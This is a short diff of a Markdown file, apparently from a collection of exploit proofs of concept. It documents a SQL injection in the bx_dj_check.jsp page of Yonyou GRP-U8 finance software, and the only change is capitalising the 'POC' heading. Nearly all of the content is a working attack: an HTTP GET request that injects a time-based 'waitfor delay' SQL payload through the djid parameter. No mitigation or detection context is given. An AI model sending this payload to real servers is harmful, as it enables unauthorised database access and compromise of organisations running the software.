@@ -1,6 +1,6 @@
 ## 用友GRP-U8-bx_dj_check.jsp存在SQL注入
 
-## poc 
+## POC 
 ```
 GET /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1';waitfor+delay+'0:0:3'-- HTTP/1.1
 Host: 
